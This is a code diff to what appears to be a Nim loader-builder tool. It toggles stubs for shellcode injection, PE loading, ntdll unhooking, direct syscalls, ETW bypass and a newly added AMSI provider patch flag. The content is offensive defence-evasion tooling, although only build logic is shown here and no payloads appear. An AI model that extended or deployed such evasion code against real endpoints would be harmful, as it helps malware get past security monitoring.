@@ -1361,6 +1361,12 @@ import ptr_math
 #import winim/utils
 #from winim import winstr,winimbase,windef
 
+when defined(ProviderPatch):
+    from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
+
+when not defined(DInvoke):
+    from winim import LdrLoadDll
+
 when defined(HardwareETW):
   from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke
 
@@ -2008,7 +2014,6 @@ stub.add(getRandStubNoTab())
 
 if (getfreshstub):
     stub.add(GetSyscallStub)
-    stub.add(NtProtectSyscallStart)
 
 if (syswhispers):
     if(jump):
@@ -2059,20 +2064,16 @@ if(getfreshstub):
 
 if(unhook):
     if(hellsgate):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     elif(getfreshstub):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(NtProtectVirtualMemoryDelegate)
-        stub.add(NtWriteVirtualMemoryDelegate)
-        stub.add(NtCloseDelegate)
-        stub.add(UnhookSyscalls)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     elif(syswhispers):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     stub.add(UnhookNtdllStub)
-else:
-    if(getfreshstub):
-        stub.add(NtProtectVirtualMemoryDelegate)
-        stub.add(NtWriteVirtualMemoryDelegate)
+
 stub.add(getRandStub())
 
 if (retrieveFromFile):
@@ -2126,10 +2127,6 @@ if (peload):
         if (hellsgate):
             stub.add(PELoadStub)
         elif(getfreshstub):
-            stub.add(NtAllocateVirtualMemoryDelegate)
-            if(localCreateThread):
-                stub.add(NtCreateThreadExDelegatePE)
-            stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
             stub.add(PELoadStub)
@@ -2165,10 +2162,6 @@ if (peload):
 
 if (shellcode):
     if (localinject):
-        if (getfreshstub):
-            if (localCreateThread):
-                stub.add(NtCreateThreadExDelegate)
-            stub.add(LocalInjectDelegates)
         stub.add(getRandStub())
         stub.add(LocalInjectStub)
         stub.add(getRandStub())
@@ -2224,10 +2217,6 @@ if (shellcode):
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
-            if(remoteMapSection):
-                stub.add(NtCreateSectionDelegate)
-                stub.add(NtMapViewOfSectionDelegate)
-            stub.add(RemoteInjectDelegates)
             stub.add(getRandStub())
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
@@ -2378,6 +2367,9 @@ if((existingprocessInjection == false) and (remoteinject)):
 
 if(ETW):
     basicCompileFlags.add("-d:HardwareETW ")
+
+if(AMSIProviderPatch):
+    basicCompileFlags.add("-d:ProviderPatch ")
 
 if(RWX == false):
     basicCompileFlags.add("-d:RX ")
